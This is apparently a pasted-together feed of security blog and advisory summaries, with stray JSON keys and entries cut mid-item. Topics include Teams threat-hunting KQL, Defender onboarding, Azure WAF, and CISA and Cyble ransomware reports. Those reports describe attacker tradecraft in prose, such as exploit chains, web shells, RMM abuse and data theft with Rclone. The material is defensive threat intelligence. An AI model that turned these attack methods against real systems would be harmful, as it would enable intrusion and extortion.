Why this matters Prevents delayed redirects: Avoids \u201cclean-at-send\u201d methods. Consistent protection in Teams: Familiar warning UX reduces risky clicks. Rapid tuning: Block newly observed domains in seconds; no advanced transport rules required. What you\u2019ll see in the video Policy check (Teams in scope) Defender portal \u2192 Email & collaboration \u2192 Policies & rules \u2192 Threat policies \u2192 Safe Links \u2192 ensure Apply Safe Links to Microsoft Teams is enabled for target users or groups OR that you use Standard/Strict Preset Policy. Warning page at click-time Post a benign test URL in Teams and click it to show the Safe Links warning experience. Block it as you spot it (Allow/Block) Defender portal \u2192 Threat policies \u2192 Tenant Allow/Block List \u2192 URLs \u2192 Add (domain or URL). Re-click in Teams \u2013 now blocked at click-time . Optional telemetry (Advanced Hunting) Confirm outcomes and adoption: UrlClickEvents | where Timestamp > ago(24h) and Workload == \"Teams\" | summarize Clicks=count(), Users=dcount(AccountUpn) by ActionType | order by Clicks desc Deployment tips Start with a pilot group that includes IT + power users; expand after validation. Create a review cadence for TABL (e.g., monthly) and expire temporary blocks. Troubleshooting No warning page? Verify policy scope includes the user and the Teams workload. Block not taking effect? Give TABL a short sync window, then re-test; confirm you blocked the correct domain/URL pattern. \u201cHunt the chat\u201d: Advanced hunting for Teams threats Overview With Advanced Hunting you can quickly reconstruct activity in Microsoft Teams \u2013 who sent the message, who clicked the link, and what protections kicked in. This section shows how the four Teams-relevant tables work together, so you can move from signal to action quickly. New: message warnings for malicious URLs (internal and external) Teams now shows a warning banner on messages that contain URLs flagged as spam, phishing, or malware. Warnings appear in internal and external chats/channels, and can be added after delivery (up to ~48 hours) if a URL\u2019s reputation changes. This complements Safe Links (time-of-click) and doesn\u2019t replace ZAP; when ZAP removes a message, that action takes precedence. Public preview began September 2025 ; GA November 2025 , enabled by default at GA and manageable in Teams admin center \u2192 Messaging settings . See Message Center: https://admin.cloud.microsoft/?#/MessageCenter/:/messages/MC1150984 The four tables you\u2019ll use MessageEvents \u2013 delivery context (sender, thread, internal vs. external). MessagePostDeliveryEvents \u2013 post-delivery actions, including Phish ZAP and Malware ZAP . MessageUrlInfo \u2013 URLs extracted from Teams messages. UrlClickEvents \u2013 time-of-click outcomes for links, including those clicked in Teams. What you\u2019ll learn in the video Surface active external domains in your tenant\u2019s Teams chats. Identify who clicked risky links and the click outcomes (via Safe Links telemetry). See where message warnings appear in the chat UI. Pivot to an incident and block indicators fast via the Tenant Allow/Block List (TABL) . A couple hunts to try right now 1) Malicious verdicts in Teams (last 24 hours) Find messages that already carry a Spam/Phish/Malware verdict \u2013 your fastest triage queue. MessageEvents | where Timestamp > ago(1d) | where ThreatTypes has \"Phish\" or ThreatTypes has \"Malware\" or ThreatTypes has \"Spam\" | project Timestamp, SenderDisplayName, SenderEmailAddress, RecipientDetails, IsOwnedThread, ThreadType, IsExternalThread, ReportId Use it for : a quick sweep + pivot to incident/entities, then TABL block if needed. 2) \u201cIT helpdesk\u201d imposters in external DMs (last 5 days) Surface social-engineering lures that impersonate support. MessageEvents | where Timestamp > ago(5d) | where IsExternalThread == true | where (RecipientDetails has \"help\" and RecipientDetails has \"desk\") or (RecipientDetails has \"it\" and RecipientDetails has \"support\") or (RecipientDetails has \"working\" and RecipientDetails has \"home\") or (SenderDisplayName has \"help\" and SenderDisplayName has \"desk\") or (SenderDisplayName has \"it\" and SenderDisplayName has \"support\") or (SenderDisplayName has \"working\" and SenderDisplayName has \"home\") | project Timestamp, SenderDisplayName, SenderEmailAddress, RecipientDetails, IsOwnedThread, ThreadType, ReportId Use it for: first-contact scams (external tenant posing as IT). Pair with Safe Links telemetry to see who clicked. Tip: has is token-aware and generally faster/cleaner than contains for word matches. Keep both hunts detection-ready by ensuring the final projection includes Timestamp and ReportId. 3) BONUS! External DMs with links (last 7 days) MessageEvents | where Timestamp > ago(7d) and IsExternalThread == true | join kind=inner (MessageUrlInfo) on TeamsMessageId | summarize Links=dcount(Url), Senders=dcount(SenderEmailAddress) by UrlDomain | top 10 by Links desc 4) Who clicked (Teams workload) \u2013 exposure view: UrlClickEvents | where Timestamp > ago(7d) and Workload == \"Teams\" | project Timestamp, AccountUpn, Url, ActionType | order by Timestamp desc \u201cFrom Hunt to Action\u201d: Respond & contain Finding a risky link in Teams is only half the job. This walkthrough shows how to go from detection to containment \u2013 block the domain, clean up delivered messages, and cut attacker access. Why this matters Speed: Shrink time from \u201cwe saw it\u201d to \u201cit\u2019s blocked\u201d. Consistency: Turns ad-hoc hunting into a repeatable response flow. Coverage: Pair URL blocking with identity and device containment. What you\u2019ll see in the video Turn a hunt into an alert In Advanced Hunting, run a short query (below) and choose Create detection rule to schedule it. Alerts auto-create incidents you can triage. Block at click-time (Safe Links + TABL) In the incident, open the URL entity and add the URL/domain to the Tenant Allow/Block List (TABL) so future Teams clicks are blocked by Safe Links. Post-delivery cleanup (ZAP) If a malicious message slipped through, ZAP can remove or mark it after delivery. You\u2019ll see evidence on the incident timeline. Contain accounts and devices Revoke user sessions in Entra ID to invalidate active tokens. Reset the password (and require strong, unique credentials), then enforce MFA for the account. Review MFA methods and remove anything suspicious; review app consents and revoke illicit grants. If endpoints are onboarded, isolate the device in Microsoft Defender for Endpoint to stop outbound connections while you investigate. The Microsoft Learn guide, https://learn.microsoft.com/en-us/defender-office-365/responding-to-a-compromised-email-account , for compromised accounts recommends session revocation, password reset, MFA enforcement, reviewing OAuth app consents and admin roles, and checking mail forwarding/rules \u2013 steps that complement the Teams response you see here. The hunt This KQL surfaces rare external domains in Teams and any user clicks. let lookback = 1d; // External Teams messages let externalMsgs = MessageEvents | where Timestamp > ago(lookback) and IsExternalThread == true | project MsgTime = Timestamp, TeamsMessageId, SenderEmailAddress, ME_ReportId = ReportId; // URLs found in Teams messages let urlsInMsgs = MessageUrlInfo | where Timestamp > ago(lookback) | project MUI_Time = Timestamp, TeamsMessageId, Url, UrlDomain, MUI_ReportId = ReportId; // Clicks coming from Teams let clicks = UrlClickEvents | where Timestamp > ago(lookback) and Workload == \"Teams\" | project ClickTime = Timestamp, Url, Clicker = AccountUpn, ClickAction = ActionType, UCE_ReportId = ReportId; // Define \u201crare\u201d domains in the period let rareDomains = urlsInMsgs | summarize msgCount = dcount(TeamsMessageId) by UrlDomain | where msgCount rareDomains | join kind=inner (urlsInMsgs) on UrlDomain | join kind=leftouter (externalMsgs) on TeamsMessageId | join kind=leftouter (clicks) on Url | project Timestamp = coalesce(ClickTime, MUI_Time, MsgTime), UrlDomain, Url, SenderEmailAddress, Clicker, ClickTime, ClickAction, TeamsMessageId, ReportId = coalesce(UCE_ReportId, MUI_ReportId, ME_ReportId) After verifying results, select Create detection rule, set a schedule (e.g., hourly), and map entities so incidents include the right artifacts. What good looks like (response playbook) Alert fires \u2192 open incident ; confirm scope and entities. Block URL/domain via TABL to stop future clicks. Confirm ZAP removed or marked delivered messages. Revoke sessions and reset password ; enforce MFA . Review MFA methods and remove unknown devices/methods . Audit app consents (revoke illicit grants) and verify the user holds no unexpected admin roles . If email abuse is suspected, check for forwarding or malicious Inbox rules . Isolate device if execution is suspected; collect artifacts and un-isolate after remediation. FAQs Does the block remove the message? No \u2013 TABL blocks at click-time . Post-delivery removal is handled by ZAP when detections apply. Will revoking sessions disrupt users? It forces sign-in again (expected). Communicate this in your response template. What if the attacker used consent phishing? Revoke the offending enterprise app consent and review publisher verification status. Call to action: Save the query, create the detection, and attach this playbook to your incident template. The goal every time: find \u2192 block \u2192 clean up \u2192 contain Securing Microsoft Teams is most effective when technology and people work together. By enabling user reporting, leveraging real-time protections, and empowering security teams to act quickly, organizations can turn everyday collaboration into a strong defense against threats. ## Please take two minutes to take this survey to let us know what you think of this blog (series), video, and community content.

      "summary": "This blog covers four key areas that are frequently missed , but they are essential for a secure and auditable deployment of Defender for Office 365. Before diving into the technical details, it is important to clarify a common misconception about Defender for Office 365 protections. Blocking Malicious File Downloads in SharePoint and OneDrive A common assumption during onboarding is that Microsoft Defender for Office 365 protections only apply to email. In reality, Safe Attachments also integrates with SharePoint Online, OneDrive for Business and Microsoft Teams. It scans files for malware even after they are uploaded or shared internally. However, this protection is only effective when the configuration explicitly prevents users from downloading files flagged as malicious. Without this setting, files detected as threats can still be downloaded locally. This creates a major risk particularly if the malware is detected post-delivery. In one investigation, I found that this setting had been left at its default, allowing users to download malicious files from SharePoint. This oversight created a significant exposure risk until it was corrected. This setting is part of the Safe Attachments for SPO/ODB policy and is critical in reducing internal exposure. Once enabled, this setting protects users in real time and acts as a powerful audit point. If someone disables this setting, whether intentionally or by accident, that action is recorded in Purview's Unified Audit Log under the DisallowInfectedFileDownloadDisabled operation. The video below offers a brief walkthrough on how to enable the setting, details the associated audit log events, and provides guidance on configuring alerts for any modifications: Video 1 \u2013 Enable, Audit, Alert: Full Setting Overview Regularly auditing for this event can help identify misconfiguration or potentially malicious administrative activity that could indicate insider threat behaviour. Including this check as part of your continuous security monitoring process is a smart, proactive move. Learn more at Step 2: (Recommended) Use SharePoint Online PowerShell to prevent users from downloading malicious files Once you have established protection against malicious files, the next step is ensuring your tenant is correctly set up to create and manage threat policies. Ensuring Organization Customization is Enabled A frustrating yet common hurdle during Defender for Office 365 onboarding is the inability to create threat policies such as anti-phishing or Safe Attachments policies. This confusion often stems from a basic configuration oversight: the tenant has not been enabled for organization customization. Without this step, the Microsoft 365 platform prevents the creation or editing of many critical security policies in Defender for Office 365. Figure 1 \u2013 Defender for Office 365 policies blocked until Enable-OrganizationCustomization is run. A few years prior with a new client being onboarded to Defender for Office 365, I encountered a situation where policy creation kept failing because this step wasn\u2019t followed. It caused unnecessary delays and frustrated the security team until we identified the missing customization. The fix is simple. Run the Enable-OrganizationCustomization PowerShell cmdlet from Exchange Online. It is a one-time configuration task, but it is essential for policy management and overall service functionality. Figure 2 - Output if you re-run the Enable-OrganizationCustomization command Including this step early in your deployment or migration plan prevents unnecessary delays and ensures the security team can fully leverage Defender for Office 365's capabilities from day one. This is particularly important for consultants who are brought in to assist after issues have already arisen. Getting ahead of this configuration means one less troubleshooting rabbit hole. Figure 3 - Output shows 'false' when customization is enabled. With customization enabled, you can now take advantage of the preset security policies to quickly build a solid baseline. Using Preset Security Policies for a Strong Starting Point One of the best tools Microsoft has provided for onboarding is the Preset Security Policies feature. These come in two flavors: Standard and Strict. Figure 4 - Defender for Office 365 Preset security policies (Standard & Strict protection) They represent Microsoft\u2019s recommended baseline configurations for anti-malware, anti-phishing, and spam protection. Learn more at Preset security policies in cloud organizations . For customers with limited security maturity or time to deeply understand the inner workings of Defender for Office 365, these presets are a game-changer. Figure 5 - Microsoft recommendation is to apply standard protection to all users In several cases, I have seen organizations with limited security teams benefit from activating these presets early. This approach gave them immediate protection while freeing up time to better understand and tune policies over time. For incident response, having a consistent and known-good baseline also helps reduce noise and false positives in the initial stages of deployment. Figure 6 - Apply strict Defender for Office 365 protection for priority users After setting foundational policies, controlling who has access to what within Defender for Office 365 is crucial to maintaining a secure environment. Implementing Unified RBAC for Least Privilege Access As more business units engage with Defender for Office 365 for everything from investigation to reporting, it is important to ensure each role has access only to what they need. Unified Role-Based Access Control (RBAC) in Defender for Office 365 makes this possible by allowing granular control over who can see and change what within the security portal. Figure 7 \u2013 Example least privilege role configuration for a Defender for Office 365 Incident Responder (image trimmed). This becomes critically valuable in larger or more complex organizations where responsibilities are split between security, compliance, IT, and operations teams. Figure 8 - Activating Microsoft Defender for Office 365 Workload in Defender XDR Roles. By using unified RBAC, you can avoid the dangerous and often default behavior of assigning Security Administrator rights to everyone involved. Instead, define roles based on function. For example, Tier 1 analysts might only need view and investigation access, while admins can manage policies. Figure 9 - Assigning a user to a Custom Microsoft Defender for Office 365 role, Entra Security Groups are also supported. This approach aligns with zero trust principles and makes it easier to audit who has access to sensitive areas. During onboarding, I recommend mapping stakeholders to the available roles and applying this model as early as possible. This helps establish accountability and improves your security posture before an incident occurs. Learn more at Map Defender for Office 365 permissions to the Microsoft Defender XDR Unified RBAC permissions Having set the right roles and permissions, it is vital to understand how these configurations contribute to a resilient and well-prepared security posture. Final Thoughts Successful onboarding to Microsoft Defender for Office 365 is not just about flipping switches. It is about making intentional configuration choices that support operational efficiency and long-term security goals. The points covered here are often missed in quick start guides but they are essential for building a solid foundation. Those who invest time in proper configuration are far better prepared when incidents arise. Migration is just the beginning.

      "title": "Consolidate & Conquer: Driving Business Transformation with Integrated Security (Part 1 of 2)",
      "summary": "In the evolving cybersecurity landscape, the choice between a unified security platform and a point solution is a strategic one with far-reaching implications. This two-part blog series examines the strategic decision organizations face between adopting a unified security platform and relying on multiple point solutions in cybersecurity. This part highlights the growing complexity of cyber threats and IT environments, emphasizing how a platform-centric approach can deliver significant business value. It explores the operational, financial, and risk-reduction benefits of integrated platforms, including cost savings, improved incident response, and enhanced resilience. Part 2 delves deeper into how unified security platforms drive operational efficiency and workforce productivity, ultimately aligning cybersecurity investments with broader business objectives. Platform Approach vs. Point Solutions As cyberthreats multiply and budgets tighten, the age-old IT question resurfaces: pick the very best point products for every domain or on a single vendor suite? Let us agree that the old saying \u201cBest of breed\u201d is not applicable for point solutions anymore. This post peels back the marketing hype and lays out the hard numbers from Forrester\u2019s TEI report and dozens of customer stories: dramatic cost savings, 80% faster response times, 75% fewer costly breaches, and measurable bumps to your margin, EPS and ROE. We define what a security platform really means in the Microsoft ecosystem compare it side-by-side with the traditional best-of-breed patchwork, and give you the references, visuals and practical advice to make the strategic choice for your business and your people. In an era of escalating cyber threats and IT complexity, security strategy has become a board-level concern. Several forces frame the platform vs. point solution decision: Rising Threats & Complex Environments: Cyberattacks are growing in speed and sophistication, while the IT environment has expanded to hybrid cloud and remote work. Siloed security tools, often legacy, struggle to provide unified visibility across on-prem, cloud, and endpoints, resulting in poor visibility and inefficient threat detection . Organizations report \u201cproliferation of security tools\u201d driving excess cost, complexity, and risk in their cyber defenses. Tool Sprawl and Alert Fatigue: Many firms have accumulated dozens of disparate security products (network firewalls, endpoint agents, IAM systems, SIEM, etc.). This patchwork can overwhelm security teams with redundant alerts and manual correlation work. Alert fatigue and disconnected point solutions lead to slower incident response and higher breach likelihood . In fact, organizations lacking integrated response tools suffer nearly one additional breach per year and $204k higher cost per incident on average \u2013 a direct impact on operations and financials. Skills Shortage & Operational Strain: The cybersecurity talent gap means lean SecOps teams must \u201cdo more with less.\u201d Best-of-breed stacks exacerbate this by requiring expertise in multiple complex tools. Security engineers often need advanced scripting or coding skills to integrate and manage point solutions. Strategic Mandates: Organizations are under pressure to improve resilience and efficiency simultaneously . Executive leadership and boards set clear priorities to reduce costs and avoid damaging breaches. They seek solutions that \u201cscale securely without adding complexity\u201d and integrate with existing enterprise systems. Importantly, investments in cybersecurity are expected to support broader financial goals \u2013 protecting revenue, safeguarding profit margins, and ensuring business continuity. A security strategy misstep (e.g. a major breach or runaway costs) can derail earnings and erode stakeholder trust. In this context, the appeal of a consolidated security platform has grown. By design, an integrated platform promises to simplify the security architecture (one cohesive ecosystem) and leverage automation/AI to address the talent and threat challenges. Conversely, a point solution philosophy offers flexibility and depth \u2013 pick a different solution for each security domain \u2013 but may compound the very issues (complexity, cost, silos) that organizations are trying to solve. So point solutions can never be best of breed. Because they are not and because they drive complexity, they drive costs, they are actually slowing down the speed that security teams need to have today. The next sections examine these two approaches and their implications in detail. What is a Security Platform Strategy? It means standardizing on a unified suite of security tools from a single vendor (or a tightly integrated set of vendors) to cover multiple needs \u2013 e.g. threat protection, identity & access management, data protection, cloud security, compliance \u2013 under one umbrella. For example, Microsoft\u2019s end-to-end security platform spans multi-cloud security across Azure, AWS and Google Cloud, Defender XDR (extended detection & response), Sentinel SIEM, identity (Entra), and compliance solutions, all designed to interoperate. The platform approach is akin to \u201ca ready-made suit\u201d where everything fits together by design . Key characteristics: one contract, one support model, unified dashboards, common data lake/analytics, and consistent user interface across the security portfolio, Defender XDR info , Sentinel info , Entra info , XDR info . What is a Point Solution Approach? In contrast, a point solution approach involves selecting different products in each security category, often resulting in a mix of vendors \u2013 e.g. one vendor for endpoint, others for identity, cloud CASB, SIEM, etc. This is like a \u201ccustom-tailored suit\u201d where each piece is chosen for a specific area. The organization assembles these point solutions into its security architecture, integrating them as needed. This approach prioritizes specialized capabilities and flexibility to swap components out as new innovations emerge. Now \u2013 when each individual product evolves and changes there is a risk that the changes creates wholes and overlaps in the architecture. This is difficult to manage and identify. In summary, a platform approach offers simplicity, unified efficacy, and lower total effort , aligning well for organizations that value streamlined operations and broad protection. A point solution approach offers customized excellence and gives you a sense of flexibility , which can be vital in specialized scenarios or when an organization has the resources to integrate and manage it properly. The choice depends on strategic priorities : If minimizing complexity and boosting efficiency is paramount, an integrated platform is compelling. If unique requirements demand the absolute best solution in each category (and the organization can handle the complexity), a point solution mix might feel like the right approach. However, it\u2019s increasingly common to pursue a \u201chybrid\u201d strategy : use a platform for core needs and augment with a few specialist tools where needed. For instance, a company might standardize Microsoft\u2019s suite for 80% of security functions but add a niche fraud detection tool or an industry-specific encryption module. This can deliver the most benefits of consolidation while addressing any critical gaps. Autonomous malware and AI-powered agents are now capable of adapting their tactics on the fly, challenging defenders to move beyond static detection and embrace behavior-based, anticipatory defense. At the same time, AI systems themselves have become high-value targets, with adversaries amping up use of methods like prompt injection and data poisoning to attack both models and systems, which could lead to unauthorized actions, data leaks, theft, or reputational damage So - on top of the traditional threat vectors, like endpoints, cloud, networks, and identities, we now must defend new elements introduced with AI: prompts and responses, AI data and orchestration, the models themselves and more. The future threat environment is poised to become more adaptive, covert, and focused on using humans to achieve initial access. This shift will challenge existing security paradigms and demand more anticipatory, behavior-based defense models across the public and private sectors. Cyber defense must evolve from reactive protection to proactive resilience\u2014driven by disruption, deterrence, and cross-sector collaboration. This urges a shift from reactive defense to proactive, tools must be integrated at all times, and automation is a must \u2013 human interaction is not enough for creating the right security posture. Next, we evaluate the business value proposition \u2013 how these approaches impact the bottom line and key performance metrics. Business Value Proposition A security strategy must ultimately deliver business value: reducing costs and risks, enabling operational excellence, and supporting financial performance. This section presents a data-driven evaluation of how a platform-based versus a point solution approach translates into tangible benefits. We focus on operational improvements tied to real customer challenges and connect them to financial outcomes such as earnings and margins. Cost Efficiency and Tool Consolidation Challenge: Enterprises often find that a sprawl of security tools leads to redundant spending \u2013 overlapping licenses, infrastructure for multiple systems, and fees for integration efforts. Each point solution carries its own cost structure, and managing many contracts can inflate the total cost of ownership. For example, a large organization might be paying for separate endpoint protection, email security, cloud CASB, DLP, SIEM, etc., each with substantial licensing fees. Platform Value: A unified platform can consolidate these costs significantly . By replacing dozens of point products with a suite, organizations eliminate duplicate functionalities and achieve economies of scale on licensing. In one analysis, a company was able to replace over 30 third-party security tools by moving to Microsoft 365 E5 , yielding about a 10% reduction in total security TCO along with 40% lower IT administrative overhead . These savings come from reduced vendor contracts, simplified infrastructure (less on-prem hardware to support old siloed tools), and lower management effort, Microsoft 365 E5 info . According to a Forrester Total Economic Impact (TEI) study of Microsoft Defender, the composite organization saved $12.0 million over 3 years through multi-cloud vendor consolidation , a 60% reduction in security tool costs . This was achieved by decommissioning legacy appliances and software, cutting data ingestion fees from multiple SIEMs, and reducing internal/external labor spent on maintaining disparate systems, TEI info . Beyond license costs, tool consolidation reduces reliance on expensive external integrations or managed service providers . The TEI study noted that Microsoft Defender\u2019s unified approach cut the need for certain external security monitoring services, contributing to the overall $17.8 million in quantified benefits. One security leader in the study remarked that the consolidation freed up budget that could be redirected to innovation or hiring more analysts, a strategic reallocation of funds, TEI info . In contrast, a point solution strategy often has diminishing returns on value due to cost. While each tool may be excellent, the aggregate cost of many premium solutions can be high. Moreover, integration projects between tools can run over budget. If an organization spends extra millions on integration middleware or custom development to make tools talk to each other, those costs eat into any incremental security benefit the best-of-breed approach provided. In short, the platform approach tends to yield a lower cost structure and higher ROI , as confirmed by the TEI finding of 242% ROI for the platform case. A fragmented approach typically would show a smaller ROI once all overheads are accounted for (and such an ROI is harder to quantify due to diffuse benefits and costs), TEI info . Conclusion In summary, adopting a platform-based approach to security tool consolidation brings organizations substantial cost savings, streamlines operations, and yields measurable improvements in business value. By eliminating redundant tools and simplifying management, companies not only reduce their total cost of ownership but also unlock resources that can be invested in innovation and talent. This strategic transition lays a solid foundation for continuous improvement and greater resilience in the face of evolving threats. Stay tuned for part 2 of our blog series , where we\u2019ll take this analysis further by exploring additional pillars of the business value framework, including \u201cOperational Efficiency and Workforce Productivity\u201d as well as \u201cRisk Reduction and Reliability.\u201d These areas will reveal even more ways a unified security strategy can empower your organization for future success.",

      "summary": "We are pleased to announce the General Availability (GA) of the JavaScript Challenge feature for Azure Web Application Firewall (WAF) on Azure Front Door. This capability equips organizations with a seamless, invisible anti-bot verification layer that distinguishes legitimate users from malicious scripts helping protect web applications from automated threats while preserving a smooth user experience. Azure WAF JavaScript Challenge Modern bot attacks are increasingly evasive, often bypassing traditional defenses like IP based blocking or simple rate limits. The JavaScript Challenge introduces a lightweight, browser-based verification step that helps distinguish legitimate users from automated scripts without requiring user interaction. Benefits of the JavaScript Challenge include: Low friction for legitimate users: Genuine users experience minimal latency or interruption since no manual interaction is required. Stronger bot protection: Automated tools and scripts fail to pass the computational challenge, enabling more effective blocking of bad bots. Flexible enforcement: You can target specific endpoints (e.g., login, registration, checkout flows), apply to bot manager or custom rules, and adjust cookie lifetimes to align with your user experience goals. How JavaScript Challenge Works The JavaScript Challenge is configured as an action in either custom rules or in the Bot Manager ruleset. When a client\u2019s HTTP/S request matches a rule with this action, Azure WAF directs the browser to a lightweight challenge page. The page runs a short computational task automatically usually invisible to the user. If the browser successfully completes the computation, the request is validated and allowed to proceed, confirming that it originated from a legitimate user. If the challenge fails, the request will be blocked, preventing automated bots from accessing the application. Getting Started If you have been using JavaScript Challenge during the public preview, your existing configurations will continue to work. For new users, simply enable the JavaScript Challenge action in your WAF policy and define the triggering conditions . For more details on configuration and best practices, check out our earlier blogs: Azure WAF Public Preview: JavaScript Challenge | Microsoft Community Hub Azure WAF\u2019s Bot Manager 1.1 and JavaScript Challenge: Navigating the Bot Threat Terrain | Microsoft Community Hub Documentation Web Application Firewall JavaScript Challenge | Microsoft Learn",

      "summary": "In writing Investigating Windows Systems , published in 2018, I made use of publicly available images found on the Internet. Some were images posted as examples of techniques, others were posted by professors running courses, and some were from CTFs. If you have read the book, you'll know that for each of the images, I either used or made a more \"real world\" scenario, something that aligned much more closely to my experiences over two and a half decades of DF/IR work, a good bit of which was consulting. During that time, and at several different companies, we'd have an \"IR hotline\" folks could call, and request computer incident response...this is something many firms continue to do. Those firms also very often had \"intake forms\", documents an analyst would fill out with pertinent information from a caller or customer, which very often included investigative goals. Over the years, the sites from which I downloaded some of the images I used have disappeared, which is unfortunate, but not a deal killer. The intent and value of the book isn't about the images, but rather, about the process. The processes used, even those where an image of a Windows XP system was used, can be replicated, developed, and extended for any Windows OS. Brett Shavers recently posted on LinkedIn , pointing the repository of available images he's compiled at DFIR.Training . Over at Stark4N6 , we see another repository of images , this one called The Evidence Locker . Here's Kevin's LinkedIn post with a description of the site. If you're not interested in downloading full or partial images, I recently took a look at an infostealer sample , from the perspective of file formats. Fortunately, the OP provided a hash for the sample they looked at, which allowed me to find a site from which I could download a copy of the sample. I'm not a malware RE guy, but what I do try to do is follow Jesse Kornblum's example of using all the parts of the buffalo , and exploit file format metadata for threat intel purposes.",

Users using the affected product versions should take the following actions to mitigate the risk of exploit: Apply AVEVA Edge 2023 R2 P01 Security Update and migrate old project files. For projects that cannot be migrated (e.g. backups or transient copies), evaluate the risk of potential password leakage from these files and implement stricter read access controls to protect these unsafe files. Require AVEVA Edge users to change their passwords. Important: Edge project migration from older versions to 2023 R2 P01 is one-way due to the change in password hashing algorithms. The following general defensive measures are recommended: Access Control Lists should be applied to all folders where users will save and load project files. Maintain a trusted chain-of-custody on project files during creation, modification, distribution, and use. Apply data-protection at the project level with a strong master password. For configuration step-by-step refer to AVEVA Edge \"Technical Reference Manual\" > Project Overview > Configuring Additional Project Settings > Options Tab > Data Protection. If passwords are being used as function parameters inside project documents (such as scripts or worksheets), it is recommended to remove those passwords and use project tags instead.

      "summary": "Today, Cybersecurity and Infrastructure Security Agency (CISA), in collaboration with the Federal Bureau of Investigation, Department of Defense Cyber Crime Center, Department of Health and Human Services, and international partners, released an updated joint Cybersecurity Advisory, #StopRansomware: Akira Ransomware , to provide network defenders with the latest indicators of compromise, tactics, techniques, and procedures, and detection methods associated with Akira ransomware activity. This advisory reflects new findings as of Nov. 13, 2025, highlighting Akira ransomware\u2019s evolution and continued threat to critical infrastructure sectors. Akira ransomware threat actors, associated with groups such as Storm-1567, Howling Scorpius, Punk Spider, and Gold Sahara, have expanded their capabilities, targeting small and medium-sized businesses as well as larger organizations across sectors including Manufacturing, Educational Institutions, Information Technology, Healthcare, Financial, and Food and Agriculture. Key Updates: Initial Access : Threat actors exploit vulnerabilities in edge devices and backup servers, such as authentication bypass, cross-site scripting, buffer overflow, and compromise credentials through brute-force techniques. Discovery : Threat actors use command line techniques to accomplish network and domain discovery. Defense Evasion : Threat actors use remote management and monitoring tools such as Anydesk and LogMeIn to mimic administrator activity, and modify firewall settings, terminate antivirus processes and uninstall EDR systems. Privilege Escalation : Threat actors deploy POORTRY malware to modify BYOVD configurations on vulnerable drivers, create administrator accounts, steal administrator login credentials, and bypass VMDK protections, as well as exploit Veeam vulnerabilities. Lateral Movement : Threat actors use remote access tools and protocols like RDP, SSH, and steal Kerberos authentication tickets to move within networks. Command and Control : Threat actors use Ngrok to establish encrypted sessions, SystemBC malware as a remote access trojan, and STONETOP malware to deploy Akira payloads. Exfiltration and Impact : Threat actors use protocols such as FTP, SFTP, and cloud services to exfiltrate data. Encryption : Threat actors use a new Akira_v2 ransomware variant that enables faster encryption speeds and further inhibits system recovery. CISA and its partners strongly encourage organizations to apply patches for known vulnerabilities, especially those affecting VPN products and backup servers, and enforce multifactor authentication for all remote access services. Organizations should monitor unauthorized domain account creation and unusual network activity while deploying endpoint detection and response solutions to enhance security.

      "title": "October 2025 Attacks Soar 30% as New Groups Redefine the Cyber Battlefield",
      "summary": "ransomware attacks in October 2025 \" data-image-caption=\"\" data-medium-file=\"https://cyble.com/wp-content/uploads/2025/11/ransomware-attacks-in-October-2025-300x150.webp\" data-large-file=\"https://cyble.com/wp-content/uploads/2025/11/ransomware-attacks-in-October-2025.webp\" title=\"October 2025 Attacks Soar 30% as New Groups Redefine the Cyber Battlefield 7\"> Ransomware attacks soared to the second-highest total on record in October 2025. October\u2019s 623 ransomware attacks were up more than 30% from September, and below only February 2025\u2019s record totals (chart below). It was the sixth consecutive monthly increase in ransomware attacks. Qilin was the most active ransomware group for the sixth time in the last seven months, its 210 claimed victims, three times higher than second-place Akira (chart below). Also of note is the third-place showing of Sinobi with 69 victims claimed, a rapid ascendance for a group that first emerged in July 2025. We include high-confidence Qilin indicators of compromise (IoCs) from October 2025 in an appendix below. Construction, Professional Services, Healthcare, Manufacturing, IT and Energy/Utilities were the most attacked sectors (chart below). In October, 31 incidents potentially impacted critical infrastructure, and 26 incidents had possible supply chain implications. The U.S. was by far the most attacked country once again, its 361 attacks 10 times more than second-place Canada (chart below). Of concern is the emergence of Australia as a top-five target, as the country\u2019s rich resources and high per-capita GDP have made the country a rich target for threat actors. Year-to-date, ransomware attacks are up 50% from the first 10 months of 2024 to 5,194 ransomware attacks through October 31, as new leaders like Qilin, Sinobi, and The Gentlemen have more than made up for the decline of former leaders such as LockBit and RansomHub. Vulnerabilities Weaponized by Ransomware Groups in October Fueling the increase in both ransomware and supply chain attacks this year has been a steady supply of critical IT vulnerabilities , as well as a large number of unpatched internet-facing assets. Among the vulnerabilities targeted in October were: Oracle E-Business Suite remote SSRF/XSL RCE (CVE-2025-61882) \u2013 targeted by Cl0p GoAnywhere MFT deserialization RCE (CVE-2025-10035) \u2013 Medusa Microsoft Windows Privilege Escalation Vulnerability (CVE-2021-43226) \u2013 Unknown ransomware groups (CISA advisory) Velociraptor Incorrect Default Permissions (CVE-2025-6264) \u2013 Warlock ransomware operators Linux kernel\u2019s netfilter :nf_tables module (CVE\u20112024\u20111086) \u2013 Unknown ransomware groups (CISA advisory) Ransomware Attacks and Key Developments Below are some of the most important ransomware developments in October 2025, culled from Cyble and OSINT sources. The Cl0p ransomware group exploited a critical vulnerability (CVE-2025-61882) in Oracle EBusiness Suite versions 12.2.3\u201312.2.14 to achieve remote code execution (RCE) via a server-side request-forgery (SSRF) that forces the application to fetch and execute a malicious XSL payload. The group sent extortion emails and appears to be leveraging this exploit as an entry point for data theft and ransomware deployment. Medusa ransomware chained an unauthenticated deserialization RCE in GoAnywhere MFT (CVE-2025-10035) to gain initial access, then maintained persistence and remote control by abusing RMM tooling (SimpleHelp and MeshAgent), dropping RMM binaries directly under the GoAnywhere process and creating .jsp web shells in MFT directories. They performed user/system discovery and network scans (e.g., netscan), moved laterally using mstsc.exe (RDP), and used the RMM infrastructure (plus a Cloudflare tunnel) for command and control (C2). Data theft was performed with Rclone in at least one incident, and Medusa ransomware was later deployed in at least one confirmed environment. Ransomware operators are increasingly hijacking or silently installing legitimate remote access tools (AnyDesk, RustDesk, Splashtop, TightVNC, etc.) after credential compromise to gain persistent, stealthy access, using these trusted channels for file transfer, interactive control, antivirus neutralization, and ransomware delivery. Attack paths include credential theft/brute force, modifying existing tool configs or using silent install flags, escalating to SYSTEM, disabling defenses, and propagating the tools to support lateral movement and final encryption. Warlock operators installed an outdated version of the open-source Velociraptor on multiple servers to establish stealthy persistence and remote control, then used it alongside a pre-existing vulnerability (CVE-2025-6264) and GPO modifications to disable defenses. They later deployed Warlock, LockBit and Babuk ransomware variants within the same engagement, while also exfiltrating data and encrypting virtual machine environments. Recent BlackSuit campaigns employed Vishing to steal VPN credentials for initial access and performed DCSync on a domain controller for high- privilege credentials. In addition, the group deployed AnyDesk and a custom RAT for persistence. Other measures 